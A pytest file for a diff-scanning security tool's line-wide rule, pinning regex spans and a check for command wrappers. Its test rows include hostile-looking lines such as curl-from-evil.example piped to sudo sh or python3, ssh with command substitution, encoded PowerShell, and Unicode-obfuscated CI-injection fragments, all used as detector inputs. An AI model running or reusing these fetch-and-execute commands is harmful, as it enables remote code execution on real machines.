"""The line-wide floor under the shell lexer (`diff_sentry/linewide.py`): the rule the project had before the lexer, kept as it was.

Three kinds of tests. The rows pin the module itself, each by the shortest input on which a mutant of it (a word dropped from a vocabulary, a pattern's alternative, class member,
bound or anchor, a comparison, a count) answers differently from the code: `_REGEX_ROWS` are the spans a pattern finds, `_WRAPPED_ROWS` what `wrapped` says of a line, `_EDGE_ROWS` which
characters `_edge` takes for markup. The tables after them pin `opening_lines` and `encloses`. The last tests are end to end: texts in which the quote that the consumer is handed is not a quote of
the raw text (a literal, a scalar, a printf, a variable, a link, a code span), which the lexer reads as closed and the floor keeps `critical`, in a body, a README patch and an rst file."""

from __future__ import annotations

import io
import re

import pytest

from diff_sentry import cli, indicators, linewide
from diff_sentry.indicators import scan_change
from tests.conftest import BENIGN_EVENT

_UV = "curl -fsSL https://astral.sh/uv/install.sh | sh"


_REGEX_ROWS = [
    ('_ADDRESS_RE', '3...', [None, None, None]),
    ('_ADDRESS_RE', '0.2.1', [None, None, None]),
    ('_ADDRESS_RE', '.9.8.9', [None, None, None]),
    ('_ADDRESS_RE', '0.8.4.8', [(0, 7), (0, 7), (0, 7)]),
    ('_ADDRESS_RE', '3.2.3.3', [(0, 7), (0, 7), (0, 7)]),
    ('_ADDRESS_RE', '3.8.6.2', [(0, 7), (0, 7), (0, 7)]),
    ('_ADDRESS_RE', '6.5.8.8', [(0, 7), (0, 7), (0, 7)]),
    ('_ADDRESS_RE', '6.7.2.4', [(0, 7), (0, 7), (0, 7)]),
    ('_ADDRESS_RE', '8.1.7.977', [(0, 9), (0, 9), (0, 9)]),
    ('_ADDRESS_RE', '881.3.8.1', [(0, 9), (0, 9), (0, 9)]),
    ('_ADDRESS_RE', '3339.7.4.8', [(1, 10), None, None]),
    ('_ADDRESS_RE', '4.1.7735.8', [None, None, None]),
    ('_APOSTROPHE_RE', "Z'A", [None, None, None]),
    ('_APOSTROPHE_RE', "a'A", [None, None, None]),
    ('_BLOCK_OPEN_RE', '<tr>', [(0, 4), (0, 4), (0, 4)]),
    ('_BLOCK_OPEN_RE', '<dd\t<>', [None, None, None]),
    ('_BLOCK_OPEN_RE', "<dd '>", [None, None, None]),
    ('_BLOCK_OPEN_RE', '<div >', [(0, 6), (0, 6), (0, 6)]),
    ('_BLOCK_OPEN_RE', '<dl\t">', [None, None, None]),
    ('_BLOCK_OPEN_RE', '<h1 >>', [(0, 5), (0, 5), None]),
    ('_BLOCK_OPEN_RE', '<li\t">', [None, None, None]),
    ('_BLOCK_OPEN_RE', '<li b>', [(0, 6), (0, 6), (0, 6)]),
    ('_BLOCK_OPEN_RE', '<ol \n>', [None, None, None]),
    ('_BLOCK_OPEN_RE', "<dl ''>", [(0, 7), (0, 7), (0, 7)]),
    ('_BLOCK_OPEN_RE', '<dt\t"">', [(0, 7), (0, 7), (0, 7)]),
    ('_BLOCK_OPEN_RE', "<hr\t''>", [(0, 7), (0, 7), (0, 7)]),
    ('_BLOCK_OPEN_RE', '<dd """>', [None, None, None]),
    ('_BLOCK_OPEN_RE', '<figure>', [(0, 8), (0, 8), (0, 8)]),
    ('_BLOCK_OPEN_RE', '<table >', [(0, 8), (0, 8), (0, 8)]),
    ('_BLOCK_OPEN_RE', '<summary\t>', [(0, 10), (0, 10), (0, 10)]),
    ('_BLOCK_OPEN_RE', '<center "">', [(0, 11), (0, 11), (0, 11)]),
    ('_BLOCK_OPEN_RE', "<table '\n'>", [None, None, None]),
    ('_BLOCK_OPEN_RE', "<center\t'''>", [None, None, None]),
    ('_BLOCK_OPEN_RE', '<figcaption>', [(0, 12), (0, 12), (0, 12)]),
    ('_BLOCK_OPEN_RE', '<figure\t"\n">', [None, None, None]),
    ('_BLOCK_OPEN_RE', '<caption\t"q">', [(0, 13), (0, 13), (0, 13)]),
    ('_BLOCK_OPEN_RE', "<summary ','>", [(0, 13), (0, 13), (0, 13)]),
    ('_CLOSING_TAG_RE', '</Z>', [(0, 4), (0, 4), (0, 4)]),
    ('_CLOSING_TAG_RE', '</m>', [(0, 4), (0, 4), (0, 4)]),
    ('_CLOSING_TAG_RE', '</am>', [(0, 5), (0, 5), (0, 5)]),
    ('_CLOSING_TAG_RE', '</m0>', [(0, 5), (0, 5), (0, 5)]),
    ('_CLOSING_TAG_RE', '</zZ>', [(0, 5), (0, 5), (0, 5)]),
    ('_CLOSING_TAG_RE', '</AzA9MA4m44M>', [(0, 14), (0, 14), (0, 14)]),
    ('_CLOSING_TAG_RE', '</M9m0aaAz0A0A>', [None, None, None]),
    ('_LABEL_WORD_RE', 'A:a', [(0, 3), (0, 3), (0, 3)]),
    ('_LABEL_WORD_RE', 'M:Z', [(0, 3), (0, 3), (0, 3)]),
    ('_LABEL_WORD_RE', 'Z:a', [(0, 3), (0, 3), (0, 3)]),
    ('_LABEL_WORD_RE', 'a:/', [None, None, None]),
    ('_LABEL_WORD_RE', 'a:A', [(0, 3), (0, 3), (0, 3)]),
    ('_LABEL_WORD_RE', 'a:a', [(0, 3), (0, 3), (0, 3)]),
    ('_LABEL_WORD_RE', 'A:/-', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'A:/0', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'A:=a', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'M:/_', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'M:Z:', [(0, 3), (0, 3), None]),
    ('_LABEL_WORD_RE', 'Z:/-', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'Z:/.', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'Z:/0', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'Z:2Z', [None, None, None]),
    ('_LABEL_WORD_RE', 'Z:A-', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'a9:m', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'a:\tm', [None, None, None]),
    ('_LABEL_WORD_RE', 'a://', [None, None, None]),
    ('_LABEL_WORD_RE', 'a:M.', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'a:Z_', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'a:a/', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'a:{a', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'aZ:Z', [(0, 4), (0, 4), (0, 4)]),
    ('_LABEL_WORD_RE', 'Z:Z;a', [(0, 3), (0, 3), None]),
    ('_LABEL_WORD_RE', 'Z:~//', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'a-:/_', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'a:.//', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'a:/-/', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'a://a', [None, None, None]),
    ('_LABEL_WORD_RE', 'a:b@M', [(0, 3), (0, 3), None]),
    ('_LABEL_WORD_RE', 'a:~/.', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'x:./9', [(0, 5), (0, 5), (0, 5)]),
    ('_LABEL_WORD_RE', 'Z:../Z', [(0, 6), (0, 6), (0, 6)]),
    ('_LABEL_WORD_RE', 'Z:.../a', [None, None, None]),
    ('_LABEL_WORD_RE', 'Z:|+"**@M', [(0, 9), (0, 9), (0, 9)]),
    ('_LABEL_WORD_RE', 'a::=]+_[<m', [None, None, None]),
    ('_LEAD_MARKUP_RE', ' ', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '"', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '#', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '$', [(0, 0), (0, 0), None]),
    ('_LEAD_MARKUP_RE', '*', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '-', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '>', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', '`', [(0, 1), (0, 1), (0, 1)]),
    ('_LEAD_MARKUP_RE', 'x', [(0, 0), (0, 0), None]),
    ('_LEAD_MARKUP_RE', '$\t', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_MARKUP_RE', '$ ', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_MARKUP_RE', '+#', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', 'Z', [None, None, None]),
    ('_LEAD_PUNCT_WORD_RE', ').', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ')M', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ')Z', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ')a', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ',.', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ',~', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', './', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', '.Z', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ':~', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', ';m', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', '>.', [None, None, None]),
    ('_LEAD_PUNCT_WORD_RE', ']A', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', '}Z', [(0, 2), (0, 2), (0, 2)]),
    ('_LEAD_PUNCT_WORD_RE', '()/', [(1, 3), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '()z', [(1, 3), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '->/', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '->Z', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '.Z-', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '.ax', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '.m/', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '.zm', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '0.x', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '2:a', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '4)Z', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '5)A', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '9.Z', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '9.x', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '9:/', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '=>.', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '=>z', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'A)A', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'A)z', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'M.A', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '[]/', [(1, 3), None, None]),
    ('_LEAD_PUNCT_WORD_RE', ']Z.', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'm.M', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'z)a', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'z)~', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', 'z..', [(0, 3), (0, 3), (0, 3)]),
    ('_LEAD_PUNCT_WORD_RE', '(A)z', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '(M)/', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '(m)m', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '(m)~', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '.->a', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '[0]z', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '[9]a', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '[A]M', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '[Z]z', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '[z]~', [(0, 4), (0, 4), (0, 4)]),
    ('_LEAD_PUNCT_WORD_RE', '--->a', [(0, 5), (0, 5), (0, 5)]),
    ('_LEAD_PUNCT_WORD_RE', '426)z', [(0, 5), (0, 5), (0, 5)]),
    ('_LEAD_PUNCT_WORD_RE', '===>~', [(0, 5), (0, 5), (0, 5)]),
    ('_LEAD_PUNCT_WORD_RE', 'aaM)Z', [(0, 5), (0, 5), (0, 5)]),
    ('_LEAD_PUNCT_WORD_RE', '(zZM)x', [(0, 6), (0, 6), (0, 6)]),
    ('_LEAD_PUNCT_WORD_RE', '---->m', [(1, 6), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '9903:Z', [(1, 6), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '====>/', [(1, 6), None, None]),
    ('_LEAD_PUNCT_WORD_RE', 'MMaA)Z', [(1, 6), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '[9z9]/', [(0, 6), (0, 6), (0, 6)]),
    ('_LEAD_PUNCT_WORD_RE', '(aaza)M', [(2, 7), None, None]),
    ('_LEAD_PUNCT_WORD_RE', '[Z0Aa]~', [(5, 7), None, None]),
    ('_LONE_OPERATOR_RE', '\n ', [None, None, None]),
    ('_LONE_OPERATOR_RE', ' <', [None, None, None]),
    ('_LONE_OPERATOR_RE', '<\n', [None, None, None]),
    ('_LONE_OPERATOR_RE', ' < ', [(1, 2), None, None]),
    ('_LONE_OPERATOR_RE', ' <>', [None, None, None]),
    ('_LONE_OPERATOR_RE', ' >\n', [(1, 2), None, None]),
    ('_LONE_OPERATOR_RE', ' > ', [(1, 2), None, None]),
    ('_LONE_OPERATOR_RE', '>>\t', [None, None, None]),
    ('_LONE_OPERATOR_RE', ' 7> ', [(1, 3), None, None]),
    ('_LONE_OPERATOR_RE', ' <<\n', [(1, 3), None, None]),
    ('_LONE_OPERATOR_RE', ' >2\n', [(1, 3), None, None]),
    ('_LONE_OPERATOR_RE', ' 074<\n', [(1, 5), None, None]),
    ('_LONE_OPERATOR_RE', ' >308 ', [(1, 5), None, None]),
    ('_LONE_OPERATOR_RE', ' 5902>\t', [None, None, None]),
    ('_LONE_OPERATOR_RE', ' <8857\n', [None, None, None]),
    ('_MARKUP_RE', '<A>', [(0, 3), (0, 3), (0, 3)]),
    ('_MARKUP_RE', '<M>', [(0, 3), (0, 3), (0, 3)]),
    ('_MARKUP_RE', '<Z>', [(0, 3), (0, 3), (0, 3)]),
    ('_MARKUP_RE', '<m>', [(0, 3), (0, 3), (0, 3)]),
    ('_MARKUP_RE', '<z>', [(0, 3), (0, 3), (0, 3)]),
    ('_MARKUP_RE', '<A9>', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<Mm>', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<ZM>', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<a >', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<m\t>', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<z\t>', [(0, 4), (0, 4), (0, 4)]),
    ('_MARKUP_RE', '<M a>', [(0, 5), (0, 5), (0, 5)]),
    ('_MARKUP_RE', '<Z\t[>', [(0, 5), (0, 5), (0, 5)]),
    ('_MARKUP_RE', '<a\t<>', [None, None, None]),
    ('_MARKUP_RE', '<a ">', [None, None, None]),
    ('_MARKUP_RE', '<a >>', [(0, 4), (0, 4), None]),
    ('_MARKUP_RE', "<m\t'>", [None, None, None]),
    ('_MARKUP_RE', '<z\t\n>', [None, None, None]),
    ('_MARKUP_RE', '<A "">', [(0, 6), (0, 6), (0, 6)]),
    ('_MARKUP_RE', "<a\t''>", [(0, 6), (0, 6), (0, 6)]),
    ('_MARKUP_RE', '<!---->', [(0, 7), (0, 7), (0, 7)]),
    ('_MARKUP_RE', "<A ']'>", [(0, 7), (0, 7), (0, 7)]),
    ('_MARKUP_RE', '<M "(">', [(0, 7), (0, 7), (0, 7)]),
    ('_MARKUP_RE', "<M '\n'>", [None, None, None]),
    ('_MARKUP_RE', '<a\t"\n">', [None, None, None]),
    ('_MARKUP_RE', '<a """>', [None, None, None]),
    ('_MARKUP_RE', "<z '''>", [None, None, None]),
    ('_MARKUP_RE', '<!--~-->', [(0, 8), (0, 8), (0, 8)]),
    ('_MARKUP_RE', '<Am94949Mm4a>', [(0, 13), (0, 13), (0, 13)]),
    ('_MARKUP_RE', '<A4mm44ZA9z9a>', [None, None, None]),
    ('_NON_ASCII_RE', '#', [None, None, None]),
    ('_NON_ASCII_RE', ']', [None, None, None]),
    ('_NON_ASCII_RE', 'e', [None, None, None]),
    ('_PATH_WORD_RE', '~', [(0, 1), (0, 1), (0, 1)]),
    ('_PATH_WORD_RE', './', [(0, 2), (0, 2), (0, 2)]),
    ('_PATH_WORD_RE', '~ ', [None, None, None]),
    ('_PATH_WORD_RE', '~/', [(0, 2), (0, 2), (0, 2)]),
    ('_PATH_WORD_RE', '../', [(0, 3), (0, 3), (0, 3)]),
    ('_PATH_WORD_RE', '.../', [(1, 4), None, None]),
    ('_VERSION_RE', '!', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '0', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '2', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '3', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '7', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '9', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '<', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '=', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '>', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', 'b', [None, None, None]),
    ('_VERSION_RE', '~', [(0, 1), (0, 1), (0, 1)]),
    ('_VERSION_RE', '!3', [(0, 1), (0, 1), (0, 2)]),
    ('_VERSION_RE', '0+', [(0, 2), (0, 2), (0, 2)]),
    ('_VERSION_RE', '1*', [(0, 2), (0, 2), (0, 2)]),
    ('_VERSION_RE', '61', [(0, 2), (0, 2), (0, 2)]),
    ('_VERSION_RE', '6|', [(0, 1), (0, 1), None]),
    ('_VERSION_RE', '7x', [(0, 2), (0, 2), (0, 2)]),
    ('_VERSION_RE', '9.', [(0, 2), (0, 2), (0, 2)]),
    ('_VERSION_RE', '<6', [(0, 1), (0, 1), (0, 2)]),
    ('_VERSION_RE', '=4', [(0, 1), (0, 1), (0, 2)]),
    ('_VERSION_RE', '>1', [(0, 1), (0, 1), (0, 2)]),
    ('_VERSION_RE', '~8', [(0, 1), (0, 1), (0, 2)]),
    ('_VERSION_RE', '~=', [(0, 2), (0, 2), (0, 2)]),
    ('_WRAPPER_ARG_RE', '-', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', '/', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', '2', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', ':', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', '=', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', '@', [(0, 1), (0, 1), (0, 1)]),
    ('_WRAPPER_ARG_RE', '\\', [None, None, None]),
    ('_WRAPPER_ARG_RE', ' -', [None, None, None]),
    ('_WRAPPER_ARG_RE', 'run', [(0, 3), (0, 3), (0, 3)]),
    ('_WRAPPER_ARG_RE', 'ssh', [(0, 3), (0, 3), (0, 3)]),
    ('_WRAPPER_ARG_RE', 'exec', [(0, 4), (0, 4), (0, 4)]),
    ('_WRAPPER_ARG_RE', 'sudo', [(0, 4), (0, 4), (0, 4)]),
    ('_WRAPPER_ARG_RE', 'execc', [None, None, None]),
    ('_WRAPPER_ARG_RE', 'shell', [(0, 5), (0, 5), (0, 5)]),
    ('_WRAPPER_ARG_RE', 'start', [(0, 5), (0, 5), (0, 5)]),
    ('_WRAPPER_ARG_RE', 'attach', [(0, 6), (0, 6), (0, 6)]),
    ('_WRAPPER_ARG_RE', 'create', [(0, 6), (0, 6), (0, 6)]),
    ('_WRAPPER_ARG_RE', ' attach', [None, None, None]),
    ('_WRAPPER_ARG_RE', 'compose', [(0, 7), (0, 7), (0, 7)]),
]

_WRAPPED_ROWS = [
    ('docker run)~~ ', True),
    ('docker run!~~ ', True),
    ('oc ', True),
    ('sh ', True),
    ('uv ', True),
    ('adb ', True),
    ('bun ', True),
    ('gdb ', True),
    ('ksh ', True),
    ('nix ', True),
    ('npm ', True),
    ('php ', True),
    ('wsl ', True),
    ('zsh ', True),
    ('~ . ', False),
    ('asdf ', True),
    ('bash ', True),
    ('dash ', True),
    ('deno ', True),
    ('fish ', True),
    ('mise ', True),
    ('node ', True),
    ('perl ', True),
    ('pnpm ', True),
    ('ruby ', True),
    ('sg x ', True),
    ('sh 3 ', False),
    ('snap ', True),
    ('su x ', True),
    ('yarn ', True),
    ('conda ', True),
    ('lxc x ', True),
    ('lxd x ', True),
    ('npx x ', True),
    ('pyenv ', True),
    ('rbenv ', True),
    ('sh >= ', False),
    ('ssh = ', True),
    ('ssh e ', False),
    ('uvx x ', True),
    ('watch ', True),
    ('bundle ', True),
    ('bunx x ', True),
    ('chroot ', True),
    ('direnv ', True),
    ('docker ', True),
    ('nodejs ', True),
    ('pipenv ', True),
    ('pipx x ', True),
    ('pnpx x ', True),
    ('poetry ', True),
    ('python ', True),
    ('uv < d ', True),
    ('2 >5 a/ ', True),
    ('< >9 h/ ', True),
    ('> < :sh ', True),
    ('busybox ', True),
    ('bwrap x ', True),
    ('flatpak ', True),
    ('oc run? ', True),
    ('pwsh -e ', True),
    ('python3 ', True),
    ('sh run; ', True),
    ('sh ssh, ', True),
    ('~ < & < ', True),
    ('adb >4 x ', True),
    ('colima x ', True),
    ('docker 1 ', False),
    ('docker = ', False),
    ('docker c ', False),
    ('f > sh > ', True),
    ('fakeroot ', True),
    ('ltrace x ', True),
    ('podman x ', True),
    ('pwsh ps1 ', False),
    ('strace x ', True),
    ('tsocks x ', True),
    ('0 < > > < ', False),
    ('docker >= ', False),
    ('h > < > > ', False),
    ('kubectl x ', True),
    ('limactl x ', True),
    ('nerdctl x ', True),
    ('nsenter x ', True),
    ('python >= ', False),
    ('ruby >6 = ', True),
    ('runuser x ', True),
    ('setpriv x ', True),
    ('sshpass x ', True),
    ('su <0 <p> ', True),
    ('toolbox x ', True),
    ('unshare x ', True),
    ('vagrant x ', True),
    ('wsl & run ', False),
    ('yarn 8< a ', True),
    ('conda 7> u ', True),
    ('docker >=3 ', False),
    ('firejail x ', True),
    ('torsocks x ', True),
    ("\u2060󠄀'\U000e0001/`({\xa0) ", False),
    ('> < < > > . ', False),
    ('distrobox x ', True),
    ('docker <3 = ', True),
    ('docker <<E> ', False),
    ('docker curl ', True),
    ('multipass x ', True),
    ('nix-shell x ', True),
    ('oc container ', False),
    ('proxychains x ', True),
    ('systemd-run x ', True),
    ('docker 3 start ', False),
    ('docker-compose ', True),
    ('n > < a/ < 2 < ', True),
    ('podman-compose ', True),
    ('proxychains4 x ', True),
    ("uv run <>0 x ' ", True),
    ('/ > 3 > > > > > ', True),
    ('/ > > > l > → > ', True),
    ('> > / > r < e < ', True),
    ('h > / > → < / < ', True),
    ('n > ~ > e < 1 < ', True),
    ('powershell -enc ', True),
    ('sh container run ', True),
    ('nix container run ', True),
    ("ssh 2>&1 web -t ' ", True),
    ('perl container run ', True),
    (': \u202e-bashhttps://${{ ', True),
    ('adb container start ', True),
    ('deno container exec ', True),
    ('uv container create ', True),
    ("=>ssh evil.example ' ", True),
    ('on:bashrefs/pull/sud ', True),
    ('}}sh`\t \x1b\t\u200da%🏴日本\t- ht ', False),
    ('\ufeff<!--`\U000e0020日本refs/pull/- ', False),
    ("󠄀日本 ㅤ'}}\ud800sudo sh'\U000e0000\U000e0001/ ", True),
    ('pwsh -EncodedCommand " ', True),
    ('docker container create ', True),
    ('Add kubectl support (#9) ', True),
    ('powershell -File x.ps1 " ', True),
    ("/<!--日本\U000e007f-\U000e0061`𝔘🏴}'︀\U000e007fpull_request ", True),
    ('$️éignore \\)\U000e007f{bashhttps://bash ', True),
    ('<!--𝔘\u200d\ufeff<!--@https://@\u200d)\U000e0001a\u200b:\U000e0061)é ', False),
    ('\\\U000e0001sh<!--ignore wget ︀\u202e\U000e0020wget ht ', False),
    ('on:curl é\U000e0020${{ )${{sudo on:/sud ', True),
    ('︀:curl a-\U000e0001wget  refs/pull/\U000e0001\u200dsh ', True),
    (')<!--}}@system promptrefs/pull/ ', True),
    ("ssh >&2 2>&1 2>&1 2>&1 2>&1 web -t ' ", True),
    ('curl https://evil.example/x | sudo sh然後 ', False),
    ('powershell -c "irm bun.sh/install.ps1|iex" ', False),
    ("ssh >&2 2>&1 2>&1 2>&1 host evil.example ' ", False),
    ('curl -fsSL https://get.docker.com | sh a.pl ', False),
    ('curl https://evil.example/x | python3 evil.py ', True),
    ('|/tmp/o : ; curl -fsSL https://evil.example/x | ', True),
    ("Use `docker run` to start it; the project's logo ", True),
    ("\u200d\u200b}🏴<!--\u200b\x1brefs/pull/ https://\U000e0020refs/pull/\U000e0000}`'\xa0é\U000e0061︀ ", False),
    ('curl -fsSL https://sh.rustup.rs | sh , then reload. ', False),
    ('Run `curl -fsSL https://get.docker.com \\| | sh` now. ', False),
    ('podman-compose evil.example curl -sSf https://sh.rustup.rs | sh ', True),
    ('[1]ssh evil.example bash -c "$(curl -fsSL https://get.docker.com)" ', True),
    ('<td>deno</td><td><code>curl -fsSL https://get.docker.com | sh</code></td> ', False),
    ('curl -sSL https://install.python-poetry.org | python3.11 - --version 1.8.3 ', True),
    ('%pull_request_target:(sudo \ud800{$https://sudo }https://𝔘\\:shé\xa0@|\xa0日本\u202e\u2060\U000e007f$curl bash\U000e0000}@ ', True),
    ('\u202e`https://ㅤpull_request_target:curl https://sudo ㅤ<!--{shrefs/pull/bashignore sh\u2060 ${{pull_request_target:\t️"}}$\U000e0061 ', False),
    ('<pre><code>/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"</code></pre> ', True),
    ('curl -LsSf https://astral.sh/uv/install.sh | sh`; Windows: `powershell -ExecutionPolicy ByPass -c "irm https://astral.sh/uv/install.ps1 | iex"` ', True),
]

_EDGE_ROWS = [
    ('!', True),
    ('"', True),
    ("'", True),
    ('(', True),
    (')', True),
    ('*', True),
    ('<', True),
    ('>', True),
    ('@', True),
    ('[', True),
    ('\\', True),
    (']', True),
    ('_', True),
    ('{', True),
    ('}', True),
]

_OPENING_ROWS = [
    (['\U000e007f︀\u2060ㅤwget }}refs/pull/日本\t️日本"︀\U000e0000\ufeffsystem prompt@a\\\U000e0001\u200d${{\U000e007f}}/shwget |\u202e\U000e0000\U000e0001curl pull_request_target:é/)️', 'x'], [0]),
    (["docker run x 'x w000 w001 w002 w003 w004 w005 w006 w007 w008 w009 w010 w011 w012 w013 w014 w015 w016 w017 w018 w019 w020 w021 w022 w023 w024 w025 w026 w027 w028 w029 w030 w031 w032 w033 w034 w035 w036 w037 w038 w039 w040 w041 w042 w043 w044 w045 w046 w047 w048 w049 w050 w051 w052 w053 w054 w055 abcd", 'x'], [0]),
]


@pytest.mark.parametrize(("name", "text", "spans"), _REGEX_ROWS, ids=[f"{n}-{i}" for i, (n, _, _) in enumerate(_REGEX_ROWS)])
def test_a_pattern_of_the_floor_finds_the_span_that_tells_it_from_each_of_its_mutants(name, text, spans):
    rx = getattr(linewide, name)
    found = []
    for method in ("search", "match", "fullmatch"):
        m = getattr(rx, method)(text)
        found.append(None if m is None else list(m.span()))
    assert found == [None if s is None else list(s) for s in spans]


@pytest.mark.parametrize(("text", "expected"), _WRAPPED_ROWS, ids=[f"w{i}" for i in range(len(_WRAPPED_ROWS))])
def test_a_line_is_or_is_not_a_program_that_runs_what_follows_it(text, expected):
    assert linewide.wrapped(text) is expected, text


@pytest.mark.parametrize(("char", "expected"), _EDGE_ROWS)
def test_a_character_is_markup_glued_to_a_word_or_it_is_not(char, expected):
    assert linewide._edge(char) is expected, char


@pytest.mark.parametrize(("lines", "expected"), _OPENING_ROWS)
def test_the_lines_that_open_something_are_found(lines, expected):
    assert linewide.opening_lines(lines) == expected, lines


